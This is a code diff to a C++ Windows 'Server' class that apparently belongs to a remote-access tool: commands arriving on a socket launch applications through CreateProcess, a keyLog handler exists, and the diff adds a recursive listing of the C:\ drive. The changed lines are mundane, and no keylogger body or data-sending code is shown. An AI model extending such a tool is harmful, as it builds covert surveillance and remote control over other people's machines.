@@ -259,7 +259,13 @@ int Server::startApp(const char* appName, SOCKET& fd){
 
     // Get the size of the buffer required to store the application information
     DWORD dataSize = 0;
-    if (RegGetValue(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\calc.exe", nullptr, RRF_RT_REG_SZ, nullptr, nullptr, &dataSize) != ERROR_SUCCESS){
+    if (RegGetValue(
+        HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\calc.exe", 
+        nullptr, 
+        RRF_RT_REG_SZ, 
+        nullptr, 
+        nullptr, 
+        &dataSize) != ERROR_SUCCESS){
         cerr << "Failed to get data size\n";
         return -1;
     }
@@ -268,7 +274,13 @@ int Server::startApp(const char* appName, SOCKET& fd){
     vector<uint8_t> data(dataSize);
 
     // Retrieve the application information
-    if (RegGetValue(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\calc.exe", nullptr, RRF_RT_REG_SZ, nullptr, &data[0], &dataSize) != ERROR_SUCCESS){
+    if (RegGetValue(
+        HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\calc.exe", 
+        nullptr, 
+        RRF_RT_REG_SZ, 
+        nullptr, 
+        &data[0], 
+        &dataSize) != ERROR_SUCCESS){
         cerr << "Failed to get data\n";
         return -1;
     }
@@ -308,7 +320,7 @@ int Server::startApp(const char* appName, SOCKET& fd){
         &si,            // Pointer to STARTUPINFO structure
         &pi)           // Pointer to PROCESS_INFORMATION structure
     ){
-        printf("CreateProcess failed (%d).\n", GetLastError());
+        cerr << "CreateProcess failed (" << GetLastError() << ").\n";
         delete[] cmd;
         return -1;
     }
@@ -363,6 +375,7 @@ int Server::keyLog(SOCKET& fd){
 }
     
 int Server::dirTree(SOCKET& fd){
+    printDirectoryTree("C:\\", 0);
     return 0;
 }
 
@@ -384,4 +397,28 @@ DWORD GetProcessIdByName(const char* processName){
 
     CloseHandle(snapshot);
     return 0;
+}
+
+void printDirectoryTree(const char* path, int indent){
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA((string(path) + "\\*").c_str(), &fd);
+
+    if (hFind != INVALID_HANDLE_VALUE){
+        do{
+            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0){
+                for (int i = 0; i < indent; i++)
+                    cout << "  ";
+
+                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
+                    cout << "[+] " << fd.cFileName << '\n';
+                    printDirectoryTree((string(path) + "\\" + fd.cFileName).c_str(), indent + 1);
+                }
+                else{
+                    cout << "    " << fd.cFileName << '\n';
+                }
+            }
+        } while (FindNextFileA(hFind, &fd));
+
+        FindClose(hFind);
+    }
 }
